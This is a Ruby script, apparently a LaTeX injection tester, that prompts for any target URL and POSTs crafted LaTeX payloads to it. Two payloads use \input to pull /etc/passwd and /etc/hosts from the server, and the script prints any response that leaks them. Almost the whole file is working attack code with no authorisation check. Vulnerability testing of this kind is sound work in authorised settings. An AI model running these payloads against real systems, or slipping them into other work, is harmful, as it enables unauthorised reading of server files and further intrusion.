require 'net/http'
require 'colorize'

def test_latex_injection(target_url)
  puts "Testing for LaTeX Injection vulnerability on: #{target_url}".colorize(:blue)
  
  # List of payloads to inject LaTeX code
  payloads = [
    "\\documentclass{article}\\begin{document}\\title{Vulnerable}\\maketitle\\textbf{Injected Text}\\end{document}",
    "\\documentclass{article}\\begin{document}\\title{Sensitive Data}\\maketitle\\textbf{\\input{/etc/passwd}}\\end{document}",
    "\\documentclass{article}\\begin{document}\\title{Sensitive Data}\\maketitle\\textbf{\\input{/etc/hosts}}\\end{document}"
  ]
  
  # Sending HTTP POST request with each payload
  payloads.each do |payload|
    uri = URI.parse(target_url)
    http = Net::HTTP.new(uri.host, uri.port)
    request = Net::HTTP::Post.new(uri.request_uri)
    request.body = "content=#{payload}"
    response = http.request(request)
    
    # Checking if vulnerability is present
    if response.body.include?('Injected Text')
      puts "The target website is vulnerable to LaTeX Injection!".colorize(:red)
      puts "To test the vulnerability, check if 'Injected Text' appears in the output HTML.".colorize(:yellow)
      return
    elsif response.body.include?('root:') || response.body.include?('localhost')
      puts "Sensitive information found in the response:".colorize(:red)
      puts response.body.colorize(:yellow)
      return
    end
  end
  
  # If no vulnerability or sensitive data found
  puts "The target website is not vulnerable to LaTeX Injection.".colorize(:green)
end

# Main program
puts "Enter your target website URL: "
target_url = gets.chomp

test_latex_injection(target_url)
